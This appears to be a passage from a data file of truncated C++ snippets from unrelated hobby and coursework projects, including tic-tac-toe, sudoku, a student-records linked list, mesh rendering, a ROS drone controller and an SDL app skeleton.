\\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t\\t  \"<<board[2][0]<<\"  | \"<<board[2][1]<<\"   |  \"<<board[2][2]<<\" \\n\";\r\n    cout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n}\r\n//Function to get the player input and update the board\r\n\r\nvoid player_turn(){\r\n    if(turn == 'X'){\r\n        cout<<\"\\nPlayer - 1 [X] turn : \";\r\n    }\r\n    else if(turn == 'O'){\r\n        cout<<\"\\nPlayer - 2 [O] turn : \";\r\n    }\r\n    //Taking input from user\r\n    //updating the board according to choice and reassigning the turn Start\r\n\r\n    cin>> choice;\r\n\r\n    //switch case to get which row and column will be update\r\n\r\n    switch(choice){\r\n        case 1:\r\n\t\t row=0; column=0; break;\r\n        case 2:\r\n\t\t row=0; column=1; break;\r\n        case 3:\r\n\t\t row=0; column=2; break;\r\n        case 4:\r\n\t\t row=1; column=0; break;\r\n        case 5:\r\n\t\t row=1; column=1; break;\r\n        case 6:\r\n\t\t row=1; column=2; break;\r\n        case 7:\r\n\t\t row=2; column=0; break;\r\n        case 8:\r\n\t\t row=2; column=1; break;\r\n        case 9:\r\n\t\t row=2; column=2; break;\r\n        default:\r\n            cout<<\"Invalid Move\\n\";\r\n    }\r\n\r\n    if(turn == 'X' && board[row][column] != 'X' && board[row][column] != 'O'){\r\n        //updating the position for 'X' symbol if\r\n        //it is not already occupied\r\n        board[row][column] = 'X';\r\n        turn = 'O';\r\n    }else if(turn == 'O' && board[row][column] != 'X' && board[row][column] != 'O'){\r\n        //updating the position for 'O' symbol if\r\n        //it is not already occupied\r\n        board[row][column] = 'O';\r\n        turn = 'X';\r\n    }else {\r\n        //if input position already filled\r\n        cout<<\"Box already filled!n Please choose another!!\\n\\n\";\r\n        player_turn();\r\n    }\r\n    /* Ends */\r\n    display_board();\r\n}\r\n\r\n//Function to get the game status e.g. GAME WON, GAME DRAW GAME IN CONTINUE MODE\r\n\r\nbool gameover(){\r\n    //checking the win for Simple Rows and Simple Column\r\n    for(int i=0; i<3; i++)\r\n    if(board[i][0] == board[i][1] && board[i][0] == board[i][2] || board[0][i] == board[1][i] && board[0][i] == board[2][i])\r\n    return false;\r\n\r\n    //checking the win for both diagonal\r\n\r\n    if(board[0][0] == board[1][1] && board[0][0] == board[2][2] || board[0][2] == board[1][1] && board[0][2] == board[2][0])\r\n    return false;\r\n\r\n    //Checking the game is in continue mode or not\r\n    for(int i=0; i<3; i++)\r\n    for(int j=0; j<3; j++)\r\n    if(board[i][j] != 'X' && board[i][j] != 'O')\r\n    return true;\r\n\r\n    //Checking the if game already draw\r\n    draw = true;\r\n    return false;\r\n}\r\nstruct Feedback {\r\n    char name[100];\r\n    int rating;\r\n    char comments[200];\r\n};\r\n\r\nclass SimpleQueue {\r\nprivate:\r\n    static const int MAX_SIZE = 100;\r\n    Feedback data[MAX_SIZE];\r\n    int frontIndex;\r\n    int rearIndex;\r\n\r\npublic:\r\n    SimpleQueue() : frontIndex(-1), rearIndex(-1) {}\r\n\r\n    bool push(const Feedback& feedback) {\r\n        if ((rearIndex + 1) % MAX_SIZE == frontIndex) {\r\n            cout << \"Queue overflow!\\n\";\r\n            return false;\r\n        }\r\n        if (frontIndex == -1) {\r\n            frontIndex = rearIndex = 0;\r\n        } else {\r\n            rearIndex = (rearIndex + 1) % MAX_SIZE;\r\n        }\r\n        data[rearIndex] = feedback;\r\n        return true;\r\n    }\r\n\r\n    Feedback front() {\r\n        if (frontIndex == -1) {\r\n            cout << \"Queue is empty!\\n\";\r\n            return {};\r\n        }\r\n        return data[frontIndex];\r\n    }\r\n\r\n    void pop() {\r\n        if (frontIndex == -1) {\r\n            cout << \"Queue is empty!\\n\";\r\n            return;\r\n        }\r\n        if (frontIndex == rearIndex) {\r\n        ",
    "#include \"rendering.h\"\n#include \"glm/fwd.hpp\"\n#include <eigen3/Eigen/src/Core/Matrix.h>\n#include <igl/readOBJ.h>\n#include <string>\n\nstruct rendering::mesh rendering::create_cube(std::string name) {\n\tstruct rendering::mesh cube;\n\n\tcube.scale = 0.5;\n\tcube.vertices = Eigen::MatrixXf(8, 3);\n\tcube.vertices << -1.0,  1.0,  1.0,\n\t\t\t\t\t  1.0,  1.0,  1.0, \n\t\t\t\t\t -1.0, -1.0,  1.0,\n\t\t\t\t\t  1.0, -1.0,  1.0, \n\t\t\t\t\t -1.0,  1.0, -1.0,\n\t\t\t\t\t  1.0,  1.0, -1.0, \n\t\t\t\t\t -1.0, -1.0, -1.0,\n\t\t\t\t\t  1.0, -1.0, -1.0;\n\n\tcube.faces = Eigen::MatrixXf(6, 4);\n\tcube.faces << 1,0,2,3,\n\t\t\t\t  5,4,6,7,\n\t              2,0,4,6,\n\t\t\t\t  3,1,5,7,\n\t              1,0,4,5,\n\t\t\t\t  3,2,6,7 ;\n\n\tcube.mesh = polyscope::registerSurfaceMesh(name, cube.vertices, cube.faces);\n\tcube.mesh->setSurfaceColor(glm::vec3(0.1, 0.5, 0.6));\n\treturn cube;\n}\n\nstruct rendering::mesh rendering::create_sphere(std::string name) {\n\tstruct rendering::mesh sphere;\n\tsphere.scale = 0.5;\n\tconst char* sphere_file = \"sphere.obj\";\n\n\tigl::readOBJ(sphere_file, sphere.vertices, sphere.faces);\n\n\tsphere.mesh = polyscope::registerSurfaceMesh(name, sphere.vertices, sphere.faces);\n\tsphere.mesh->setSurfaceColor(glm::vec3(0.1, 0.5, 0.6));\n\treturn sphere;\n}\n\nstruct rendering::mesh rendering::create_square(std::string name) {\n\tstruct rendering::mesh square;\n\n\tsquare.scale = 0.5;\n\tsquare.vertices = Eigen::MatrixXf(4, 3);\n\tsquare.vertices <<  1.0,  0.0,  1.0,  \n\t\t\t\t\t   -1.0,  0.0,  1.0,\n\t\t\t\t\t   -1.0,  0.0, -1.0,\n\t\t\t\t\t    1.0,  0.0, -1.0;\n\n\tsquare.faces = Eigen::MatrixXf(1, 4);\n\tsquare.faces << 0, 1, 2, 3;\n\n\tsquare.mesh = polyscope::registerSurfaceMesh(name, square.vertices, square.faces);\n\t// square.mesh->setSurfaceColor(glm::vec3(0.1, 0.5, 0.6));\n\treturn square;\n}\n\n\nvoid rendering::update_mesh(rendering::mesh& mesh, Eigen::Vector3f position, Eigen::Quaternionf rotaion) {\n\tEigen::MatrixXf new_vertices(mesh.vertices.rows(), mesh.vertices.cols());\n\tfor(int i = 0; i < mesh.vertices.rows(); i++) {\n\t\tEigen::Vector3f vertex(mesh.vertices(i, 0), mesh.vertices(i, 1), mesh.vertices(i, 2));\n\t\tEigen::Vector3f new_vertex = position + mesh.scale* rotaion._transformVector(vertex);\n\n\t\tnew_vertices(i, Eigen::all) << new_vertex(0), new_vertex(1), new_vertex(2);\n\t}\n\tmesh.mesh->updateVertexPositions(new_vertices);\n}",
    "#include \"ros/ros.h\"\n#include \"std_msgs/String.h\"\n#include \"plutodrone/PlutoPilot.h\"\n#include <geometry_msgs/PoseArray.h>\n#include <sys/time.h>\n#include <boost/thread.hpp>\n#include <boost/chrono.hpp>\n#include <pthread.h>\n#include <unistd.h>\n#include <plutodrone/Common.h>\n#include <plutodrone/Protocol.h>\n#include <plutodrone/PlutoMsg.h>\n#include <plutodrone/PlutoMsgAP.h>\n#include <stdlib.h>\n#include <string>\n\nusing namespace std;\n\n\nbool isSocketCreate=false;\n\nint isAutoPilotOn = 0;\n\nint userRC[9]={1500,1500,1500,1500,1000,1000,1000,1000,0};\n\nint userRCAP[5]={1500,1500,1500,1500,0};\n\nint droneRC[9] = {1500,1500,1500,1500,1000,1000,1000,1000,0};\n\n\n//vector of all string ips\nvector <string> all_ips;\n\nCommunication com;\nProtocol pro;\n\nros::ServiceClient serviceClient;\nplutodrone::PlutoPilot service[2];\n\nstruct ip_struct\n{\n  int index;\n  std::string ip;\n};\n\nvoid *createSocket(void *arg){\n\n  struct ip_struct local_var = *(struct ip_struct *)arg;\n  isSocketCreate=com.connectMulSock(local_var.ip, local_var.index);\n  pthread_exit(NULL);\n};\n\nvoid *writeFunction(void *threadid){\n\n  std::vector<int> requests;\n  requests.push_back(MSP_RC);\n  requests.push_back(MSP_ATTITUDE);\n  requests.push_back(MSP_RAW_IMU);\n  requests.push_back(MSP_ALTITUDE);\n\n  while(1)\n  {\n\n    memcpy(droneRC, userRC, sizeof(userRC));\n\n    if(isAutoPilotOn && droneRC[7] == 1500 && droneRC[8] == userRCAP[4]) {\n      droneRC[0] += userRCAP[0] - 1500;\n      droneRC[1] += userRCAP[1] - 1500;\n      droneRC[2] += userRCAP[2] - 1500;\n      droneRC[3] += userRCAP[3] - 1500;\n\n    }\n\n    pro.sendMulRequestMSP_SET_RAW_RC(droneRC);\n    pro.sendMulRequestMSP_GET_DEBUG(requests, droneRC[8]);\n\n\n    usleep(22000);\n  }\n  pthread_exit(NULL);\n}\n\nvoid *readFunction(void *threadid){\n  do\n  {\n    com.readFrame();\n  }\n  while(1);\n  pthread_exit(NULL);\n}\n\nvoid *readMulFunction(void *arg){\n\n  struct ip_struct local_var = *(struct ip_struct *)arg;\n  do\n  {\n    com.readMulFrame(local_var.index);\n  }\n  while(1);\n  pthread_exit(NULL);\n}\n\nvoid *serviceFunction(void *arg){\n  struct ip_struct local_var = *(struct ip_struct *)arg;\n  while (1)\n  {\n    if (serviceClient.call(service[local_var.index]))\n    {\n      service[local_var.index].request.accX=accX;\n      service[local_var.index].request.accY=accY;\n      service[local_var.index].request.accZ=accZ;\n      service[local_var.index].request.gyroX=gyroX;\n      service[local_var.index].request.gyroY=gyroY;\n      service[local_var.index].request.gyroZ=gyroZ;\n      service[local_var.index].request.magX=magX;\n      service[local_var.index].request.magY=magY;\n      service[local_var.index].request.magZ=magZ;\n      service[local_var.index].request.roll=roll;\n      service[local_var.index].request.pitch=pitch;\n      service[local_var.index].request.yaw=yaw;\n      service[local_var.index].request.alt=alt;\n    }\n  }\n pthread_exit(NULL);\n}\n\nvoid readDroneCommand(const plutodrone::PlutoMsg::ConstPtr& msg){\n userRC[0] = msg->rcRoll;\n userRC[1] = msg->rcPitch;\n userRC[2] = msg->rcThrottle;\n userRC[3] = msg->rcYaw;\n userRC[4] = msg->rcAUX1;\n userRC[5] = msg->rcAUX2;\n userRC[6] = msg->rcAUX3;\n userRC[7] = msg->rcAUX4;\n userRC[8] = msg->plutoIndex;\n\n isAutoPilotOn = msg->isAutoPilotOn;\n}\n\nvoid readDroneAPCommand(const plutodrone::PlutoMsgAP::ConstPtr& msg){\n\n  userRCAP[0] = msg->rcRoll;\n  userRCAP[1] = msg->rcPitch;\n  userRCAP[2] = msg->rcThrottle;\n  userRCAP[3] = msg->rcYaw;\n}\n\nvoid connectPluto(){\n\n}\n\nint main(int argc, char **argv){\n\n  ros::init(argc, argv, \"plutoswarm\");\n\n  //add IPs here\n  all_ips.push_back(\"192.168.43.151\");\n\n  unsigned int i = 0;\n\n  //struct to pass to create thread\n  struct ip_struct ipStructVar;\n\n  //Topic name. Index gets appended in for loop\n  char topic_name[] = \"drone_command/ \";\n  char topic_ap_name[] = \"drone_ap_command/ \";\n  char service_name[] = \"PlutoService \";\n\n  ros::NodeHandle n;\n\n  //create thread\n  pthread_t tds[all_ips.size()];\n  //read thread\n  pthread_t rds[all_ips.size()];\n  //write thread\n  pthread_t wds[all_ips.size()];\n  //service thread\n  pthread_t sds[all_ips.size()];\n\n  int rc;\n\n  for(i = 0; i < all_ips.size(); i++){\n    cout<<\"Start\";\n\n    //Add an index to the topic\n    topic_name[strlen(topic_name)-1] = 0x30+i;\n    topic_ap_name[strlen(topic_name)-1] = 0x30+i;\n\n    //Add an index to the service\n    service_name[strlen(service_name)-1] = 0x30+i;\n\n    //Multiple topics is not really required since a single callback is being used\n    //and PlutoMsg is modified to identify the drone by index starting from 0.\n    //However, I've placed it to make it user friendly.\n    n.subscribe(topic_name, 1000, readDroneCommand);\n    n.subscribe(topic_ap_name, 1000, readDroneAPCommand);\n\n    //Get the IP in the IP struct\n    ipStructVar.index = i;\n    ipStructVar.ip = all_ips[i];\n\n    //create thread\n    rc = pthread_create(&tds[i], NULL, createSocket, (void *) &ipStructVar);\n    if (rc)\n    {\n      cout << \"Error:unable to create communication thread,\" << rc << endl;\n      exit(-1);\n    }\n\n    pthread_join( tds[i],",
    "/*\r\n    @ Anas\r\n    @ Odai\r\n    @ Haneen\r\n*/\r\n\r\n#include <iostream> \r\n#include <fstream> \r\n#include \"json.hpp\"\r\nusing namespace std;\r\nusing namespace nlohmann;\r\n\r\nstruct Data {\r\n    string name;\r\n    int age;\r\n    string sex;\r\n    int grade;\r\n    string city;\r\n    string fatherNumber;\r\n};\r\n\r\nstruct Node {\r\n    int studentId;\r\n    Data studentData;\r\n    Node* next;\r\n    Node* prev;\r\n};\r\n\r\nclass LinkedList {\r\n    private: \r\n        Node* head;\r\n        Node* tail;\r\n\r\n    public: \r\n        LinkedList() {\r\n            head = nullptr;\r\n            tail = nullptr;\r\n        }\r\n        \r\n        void insert();\r\n        void remove(); \r\n        void updateIds();\r\n        void displayTable();\r\n        void updateJsonFile();\r\n        void updateList();\r\n        void insertionSortAscending();\r\n        void insertionSortDescending();\r\n        void linearSearch();\r\n        void binarySearch();     \r\n};\r\n\r\nint validateInput();\r\n\r\nint main() { \r\n    LinkedList* students = new LinkedList;\r\n    students->updateList();\r\n\r\n    bool key = true;\r\n    while (key) {\r\n        students->displayTable();\r\n\r\n        cout << \"1# Add Student             2# Delete Student    3# Sort Descending Order\\n\";\r\n        cout << \"4# Sort Ascending Order    5# Search by ID      6# Search by Name\\n7# Exit\\n\\n\";\r\n\r\n        cout << \"@ Enter your choice\\n ~> \";\r\n        int choice = validateInput();\r\n        \r\n\r\n        switch (choice) {\r\n            case 1: students->insert();\r\n                    students->updateJsonFile();\r\n                    break;\r\n            \r\n            case 2: students->remove();\r\n                    students->updateJsonFile();\r\n                    break;\r\n            \r\n            case 3: students->insertionSortDescending();\r\n                    students->displayTable();\r\n                    break;\r\n            \r\n            case 4: students->insertionSortAscending();\r\n                    students->displayTable();\r\n                    break;\r\n            \r\n            case 5: students->binarySearch();\r\n                    break;\r\n            \r\n            case 6: students->linearSearch();\r\n                    break;\r\n            \r\n            case 7: system(\"cls\");\r\n                    system(\"color 0A\");\r\n                    cout << \"@Haneen  @Anas  @Odai\\n\";\r\n                    exit(0);\r\n                    break;\r\n\r\n            default: cout << \"* Invalid input\\n\";\r\n        }\r\n\r\n        cout << \"\\n@ Press [ 1 ] ~> continue\\n@ Press [ 2 ] ~> Exit the App\\n ~> \";\r\n        int exit = validateInput();\r\n    \r\n        if (exit == 1) {\r\n           system(\"cls\");\r\n        } else {\r\n            system(\"cls\");\r\n            system(\"color 0A\");\r\n            cout << \"@Haneen  @Anas  @Odai\\n\";\r\n            key = false;\r\n        }\r\n    }\r\n}\r\n\r\nvoid LinkedList::insert() {\r\n    Node* newStudent = new Node;\r\n\r\n    cout << \"$ Student Name ~> \";\r\n    cin >> newStudent->studentData.name;\r\n\r\n    cout << \"$ Student Age ~> \";\r\n    newStudent->studentData.age = validateInput();\r\n\r\n    cout << \"\\n@ Press [ 1 ] ~> Male\\n@ Press [ 2 ] ~> Female\\n\";\r\n    cout << \"$ Student Six ~> \";\r\n    int choice = validateInput();\r\n\r\n    if (choice == 1) {\r\n        newStudent->studentData.sex = \"Male\";\r\n    } else if (choice == 2) {\r\n        newStudent->studentData.sex = \"Female\";\r\n    } else {\r\n        newStudent->studentData.sex = \"NULL\";\r\n    }\r\n\r\n    cout << \"$ Student Grade ~> \";\r\n    newStudent->studentData.grade = validateInput();\r\n\r\n    cout << \"$ Student City ~> \";\r\n    cin >> newStudent->studentData.city;\r\n\r\n    cout << \"$ Student Father Phone Number ~>\";\r\n    cin >> newStudent->studentData.fatherNumber;\r\n\r\n    int id = 1;\r\n\r\n    if (head == nullptr) {\r\n        newStudent->studentId = id;\r\n        newStudent->next = nullptr;\r\n        newStudent->prev = nullptr;\r\n        head = newStudent;\r\n        tail = newStudent;\r\n    } else {\r\n        Node* current = tail;\r\n        newStudent->studentId = current->studentId + 1;\r\n        current->next = newStudent;\r\n        tail = newStudent;\r\n\r\n        newStudent->next = nullptr;\r\n        newStudent->prev = current;\r\n    }\r\n}\r\n\r\nvoid LinkedList::remove() {\r\n    if (head == nullptr) {\r\n        cout << \"* There is no students in the school\\n\";\r\n    } else {\r\n        cout << \"$ Delete Student with ID number ~> \";\r\n        int stuId = validateInput();\r\n        \r\n        Node* current = head;\r\n        while (current != nullptr && current->studentId != stuId) {\r\n            current = current->next;\r\n        }\r\n\r\n        if (current == nullptr) {\r\n            cout << \"* The student with ID number { \" << stuId << \" } not found\\n\";\r\n            return;\r\n        }\r\n        \r\n        if (current == head) {\r\n            head = current->next;\r\n            if (head != nullptr) { \r\n                head->prev = nullptr;\r\n            }\r\n            delete current;\r\n            current = nullptr;\r\n            updateIds();\r\n            return;\r\n        }\r\n\r\n        if (current->next == nullptr) {\r\n            current->prev->next = c",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <cstring>\r\nusing namespace std;\r\n\r\nconst int N = 9;\r\n\r\nbool isSafe(int board[N][N], int row, int col, int num) \r\n{\r\n    // Check if 'num' is already in the same row\r\n    for (int i = 0; i < N; i++)\r\n        if (board[row][i] == num)\r\n            return false;\r\n\r\n    // Check if 'num' is already in the same column\r\n    for (int i = 0; i < N; i++)\r\n        if (board[i][col] == num)\r\n            return false;\r\n\r\n    // Check if 'num' is already in the same 3x3 box\r\n    int boxRowStart = row - row % 3;\r\n    int boxColStart = col - col % 3;\r\n\r\n    for (int i = 0; i < 3; i++)\r\n        for (int j = 0; j < 3; j++)\r\n            if (board[i + boxRowStart][j + boxColStart] == num)\r\n                return false;\r\n\r\n    return true;\r\n}\r\n\r\nvoid printBoard(int grid[N][N]) \r\n{\r\n\r\n    system(\"cls\");\r\n    \r\n    cout << \"\\t\\t\\t                        WELCOME TO SUDOKU Game!                                 |\" << endl;\r\n    cout << \"\\t\\t\\t      Fill in the missing numbers to solve the puzzle.       \" << endl;\r\n    \r\n    for (int row = 0; row < N; row++){\r\n      for (int col = 0; col < N; col++){\r\n         if(col == 3 || col == 6)\r\n            cout << \" | \";\r\n         cout << grid[row][col] <<\" \";\r\n      }\r\n      if(row == 2 || row == 5){\r\n         cout << endl;\r\n         for(int i = 0; i<N; i++)\r\n            cout << \"---\";\r\n      }\r\n      cout << endl;\r\n   }\r\n}\r\n\r\n\r\nbool solveSudoku(int board[N][N], int row, int col) \r\n{\r\n    // If all cells are filled, the puzzle is solved\r\n    if (row == N - 1 && col == N)\r\n        return true;\r\n\r\n    // Move to the next row if the current column is N\r\n    if (col == N)\r\n\t{\r\n        row++;\r\n        col = 0;\r\n    }\r\n\r\n    // Skip the cells that already have a value\r\n    if (board[row][col] != 0)\r\n        return solveSudoku(board, row, col + 1);\r\n\r\n    // Try filling the current cell with a number from 1 to 9\r\n    for (int num = 1; num <= 9; num++) \r\n\t{\r\n        if (isSafe(board, row, col, num)) \r\n\t\t{\r\n            board[row][col] = num;\r\n\r\n            if (solveSudoku(board, row, col + 1))\r\n                return true;\r\n\r\n            board[row][col] = 0;\r\n        }\r\n    }\r\n    return false;\r\n}\r\n\r\nbool isSolvedCompletely(int grid[N][N])\r\n{\r\n    for (int row = 0; row < N; row++)\r\n        for (int col = 0; col < N; col++)\r\n            if (grid[row][col] == 0)\r\n                return false;\r\n\r\n    return true;\r\n}\r\n\r\nvoid playGame(int board[N][N])\r\n{\r\n    int ch;\r\n    int row, col, num;\r\n    while(true)\r\n\t{\r\n        printBoard(board);\r\n        cout << endl << endl;\r\n        cout << \"Unable to solve? Enter -1 as row, col and num to view the solved sudoku.\"<<endl;\r\n        cout << \"Enter row: \";\r\n        cin >> row;\r\n        cout << \"Enter column: \";\r\n        cin >> col;\r\n        cout << \"Enter number: \";\r\n        cin >> num;\r\n\r\n        if(row == -1 || col == -1 || num == -1)\r\n\t\t{\r\n            solveSudoku(board, 0, 0);\r\n            printBoard(board);\r\n            cout << endl;\r\n            cout << \"Better luck next time!!!\" << endl;\r\n            return;\r\n        }\r\n        if (isSolvedCompletely(board))\r\n            break;\r\n        row--;\r\n        col--;\r\n        if (!isSafe(board, row, col, num)) \r\n\t\t{\r\n            cout << \"Invalid move. Try again.\" << endl;\r\n            continue;\r\n        }\r\n        board[row][col] = num;\r\n    }\r\n\r\n    // Check if the user has solved it correctly or not\r\n    bool solved = true;\r\n    for (int i = 0; i < N; i++) \r\n\t{\r\n        for (int j = 0; j < N; j++) \r\n\t\t{\r\n            if (board[i][j] == 0) \r\n\t\t\t{\r\n                solved = false;\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    if (solved) \r\n\t{\r\n        cout << \"Congratulations! You have solved the puzzle.\" << endl;\r\n        printBoard(board);\r\n    }\r\n    else \r\n\t{\r\n        cout << \"Puzzle not solved. Better luck next time.\" << endl;\r\n    }\r\n\r\n}\r\n\r\nint main() \r\n{\r\n\r\n    system(\"title Sudoku Game \");\r\n    \r\n    int board[N][N] = \r\n\t{\r\n        {3, 0, 6, 5, 0, 8, 4, 0, 0},\r\n        {5, 2, 0, 0, 0, 0, 0, 0, 0},\r\n        {0, 8, 7, 0, 0, 0, 0, 3, 1},\r\n        {0, 0, 3, 0, 1, 0, 0, 8, 0},\r\n        {9, 0, 0, 8, 6, 3, 0, 0, 5},\r\n        {0, 5, 0, 0, 9, 0, 6, 0, 0},\r\n        {1, 3, 0, 0, 0, 0, 2, 5, 0},\r\n        {0, 0, 0, 0, 0, 0, 0, 7, 4},\r\n        {0, 0, 5, 2, 0, 6, 3, 0, 0}\r\n    };\r\n\r\n    \r\n    cout << \"\\t\\t\\t                        WELCOME TO SUDOKU Game!             \" << endl;\r\n    cout << \"\\t\\t\\t          Fill in the missing numbers to solve the puzzle.      \" << endl;\r\n    \r\n\r\n    while (true) \r\n\t{\r\n\r\n        int choice;\r\n        cout << endl << endl;\r\n        cout << \" 1.Solve the Sudoku\" << endl;\r\n        cout << \" 2.Unable to solve? View the solved Sudoku\" << endl;\r\n        cout << \" 3.Exit\" << endl;\r\n        cout << \" Enter your choice: \";\r\n        cin >> choice;\r\n\r\n        switch (choice) \r\n\t\t{\r\n            case 1:\r\n                playGame(board);\r\n                break;\r\n            case 2:\r\n                if (solveSudoku(board, 0, 0))\r\n          ",
    "#include <iostream>\n#include <windows.h> // WinApi header - needed for setting console color\n#include <random>\n\n#include \"SocialNetwork.h\"\n\nusing std::cout;\nusing std::endl;\n\n#define GREEN 2\n#define DARK_RED 4\n#define YELLOW 6\n#define LIGHT_BLUE 9\n#define LIGHT_GREEN 10\n#define TEAL 11\n#define RED 12\n#define PURPLE 13\n#define LIGHT_YELLOW 14\n#define WHITE 15\n\nstd::string posts[] = { \"Hello world!\",\n\t\t\t\t\t\t\"Good morning :)\",\n\t\t\t\t\t\t\"Magshimim forever ***\" ,\n\t\t\t\t\t\t\"Ekronot is the best...\",\n\t\t\t\t\t\t\"Happy birthday! Ad 120\" };\n\nstd::string statusMessages[] = \n\t\t\t\t\t{\"Feeling sick, need chicken soup... can you bring me some?\",\n\t\t\t\t\t\"Which witch watched which watch??? you must tell me!!!\",\n\t\t\t\t\t\"Finally got my driver license !!!, when are you getting yours?\",\n\t\t\t\t\t\"\\\"No matter how smart you are, you can never convince someone stupid that they are stupid.\\\"\",\n\t\t\t\t\t\"Have you ever wondered why you can't taste your tongue?\"};\n\nvoid set_console_color(unsigned int color)\n{\n\t// colors are 0=black 1=blue 2=green and so on to 15=white\n\t// colorattribute = foreground + background * 16\n\t// to get red text on yellow use 4 + 14*16 = 228\n\t// light red on yellow would be 12 + 14*16 = 236\n\t// a Dev-C++ tested console application by vegaseat 07nov2004\n\n\tHANDLE hConsole;\n\n\thConsole = GetStdHandle(STD_OUTPUT_HANDLE);\n\tSetConsoleTextAttribute(hConsole, color);\n}\n\n// gets a random number between a range of numbers\nint getRandomInt(int min, int max)\n{\n\tstd::random_device rd;     // only used once to initialise (seed) engine\n\tstd::mt19937 rng(rd());    // random-number engine used (Mersenne-Twister in this case)\n\tstd::uniform_int_distribution<int> uni(min, max); // guaranteed unbiased\n\n\tauto random_integer = uni(rng);\n\treturn random_integer;\n}\n\nstd::string getDeviceTypeString(const DeviceType type)\n{\n\tif (type == PC)\n\t\treturn \"PC\";\n\telse if (type == LAPTOP)\n\t\treturn \"Laptop\";\n\telse if (type == TABLET)\n\t\treturn \"Tablet\";\n\telse if (type == PHONE)\n\t\treturn \"Phone\";\n\treturn \"Unknown\";\n}\n\nstd::string getDeviceString(const Device& device)\n{\n\treturn \n\t\t\"[ID: \" + std::to_string(device.getID()) + \n\t\t\", Type: \" + getDeviceTypeString(device.getType()) +\n\t\t\", OS: \" + device.getOS() + \n\t\t\", Activated: \" + (device.isActive() ? \"Yes\" : \"No\") + \"]\";\n}\n\nstd::string getUserString(const User& user)\n{\n\treturn\n\t\t\"[ID: \" + std::to_string(user.getID()) +\n\t\t\", Username: \" + user.getUserName() +\n\t\t\", Age: \" + std::to_string(user.getAge()) + \n\t\t\", All devices On: \" + (user.checkIfDevicesAreOn() ? \"Yes\" : \"No\") + \"]\";\n}\n\nstd::string getUserDevicesString(User& user)\n{\n\tstd::string result = \"\";\n\tDevicesList userDevices = user.getDevices();\n\tDeviceNode* device = userDevices.get_first();\n\tfor (; device != nullptr; device = device->get_next())\n\t{\n\t\tresult += getDeviceString(device->get_data());\n\t\tresult += \"\\n\";\n\t}\n\tif (result != \"\")\n\t{\n\t\t// removes the '\\n' at the end of the string\n\t\tresult = result.substr(0, result.length() - 1);\n\t}\n\treturn result;\n}\n\nstd::string getProfileString(const Profile& profile)\n{\n\treturn\n\t\t\"Owner: \" + getUserString(profile.getOwner()) + \"\\n\" +\n\t\tprofile.getOwner().getUserName() + \"'s page:\\n\" + \n\t\tprofile.getPage();\n}\n\nvoid allFriends(Profile* profiles[], const int numOfProfiles)\n{\n\tfor (unsigned int i = 0; i < numOfProfiles; i++)\n\t{\n\t\tfor (unsigned int j = 0; j < numOfProfiles; j++)\n\t\t{\n\t\t\tif (j != i)\n\t\t\t{\n\t\t\t\tprofiles[i]->addFriend(profiles[j]->getOwner());\n\t\t\t}\n\t\t}\n\t}\n}\n\nvoid generateRandomPage(Profile& profile)\n{\n\tstd::string status = statusMessages[getRandomInt(0, 4)];\n\tprofile.setStatus(status);\n\n\tint numberOfPosts = getRandomInt(0, 3);\n\tstd::string post;\n\tfor (unsigned int i = 0; i < numberOfPosts; i++)\n\t{\n\t\tpost = posts[getRandomInt(0, 4)] ;\n\t\tprofile.addPostToProfilePage(post);\n\t}\n}\n\nbool test1Device()\n{\n\tbool result = false;\n\n\ttry\n\t{\n\t\t// Tests Ex2 part 1 - Device\n\n\t\tset_console_color(TEAL);\n\t\tcout <<\n\t\t\t\"*******************\\n\" <<\n\t\t\t\"Test 1 - Device\t\t\t\t\\n\" <<\n\t\t\t\"*******************\\n\" << endl;\n\n\t\tset_console_color(WHITE);\n\n\t\tcout <<\n\t\t\t\"Initializing Device1: ... \\n\" << endl;\n\n\t\tDevice device1;\n\t\tdevice1.init(3343, PC, WINDOWS11);\n\t\tstd::string expected = \"[ID: 3343, Type: PC, OS: Windows11, Activated: Yes]\";\n\t\tstd::string got = getDeviceString(device1);\n\t\tcout << \"Expected: \" << expected << endl;\n\t\tcout << \"Got     : \" << got << std::endl;\n\t\tif (got != expected)\n\t\t{\n\t\t\tset_console_color(RED);\n\t\t\tstd::cout << \"FAILED: Device information is not as expected\\n\" <<\n\t\t\t\t\"check functions Device::init(), Device::getID(), \\n\" <<\n\t\t\t\t\"Device::getOS(), Device::getType()\\n\";\n\t\t\treturn false;\n\t\t\tset_console_color(WHITE);\n\t\t}\n\n\t\tcout <<\n\t\t\t\"\\nDeactivating Device1: ... \\n\" << endl;\n\t\tdevice1.deactivate();\n\n\t\texpected = \"[ID: 3343, Type: PC, OS: Windows11, Activated: No]\";\n\t\tgot = getDeviceString(device1);\n\t\tcout << \"Expected: \" << expected << endl;\n\t\tcout << \"Got     : \" << got << std::endl;\n\t\tif (got != expected)\n\t\t{\n\t\t\tset_console_color(RED);\n\t\t\tstd::cout << \"FAILED: Device information is not as expected\\n\" <<\n\t\t\t\t\"check functions Device::init()",
    "// Local Headers\n#include \"../include/App.hpp\"\n\nstd::shared_ptr<SDL_Renderer> App::renderer = nullptr;\n\nApp::App() { \n    std::clog << \"App created!\\n\";\n    currentMode_ = Mode::MainMenu;\n    mode = std::make_unique<MainMenu>();\n}\n\nApp::~App() {\n    SDL_Quit();\n    TTF_Quit();\n    std::clog << \"SDL quitted...\\n\";\n    std::clog << \"App destroyed!\\n\"; \n}\n\nvoid App::setMode(Mode newMode) {\n    currentMode_ = newMode;\n    switch (newMode) {\n        case Mode::MainMenu:\n            std::clog << \"Current AppMode: MainMenu\\n\";\n            mode = std::make_unique<MainMenu>();\n            break;\n        case Mode::Game:\n            std::clog << \"Current AppMode: Game\\n\";\n            mode = std::make_unique<Game>();\n            break;\n        case Mode::Settings:\n            std::clog << \"Current AppMode: Settings\\n\";\n            mode = std::make_unique<Settings>();\n            break;\n        default:\n            break;\n    }\n}\n\nvoid App::init(const std::string& title, const int& x, const int& y, const int& width, const int& height, const unsigned int& flags) {\n    // Init all SDL shit or it won't work\n    if(SDL_Init(SDL_INIT_EVERYTHING) == 0 && TTF_Init() == 0) { // App needs SDL initialized to do anything\n        std::clog << \"SDL initialized...\\n\";\n        window_ = std::shared_ptr<SDL_Window>(SDL_CreateWindow(title.c_str(), x, y, width, height, flags), SDL_DestroyWindow);\n\n        if(window_.get()) { // App needs a window_ to create renderer\n            std::clog << \"Window created...\\n\"; \n            renderer = 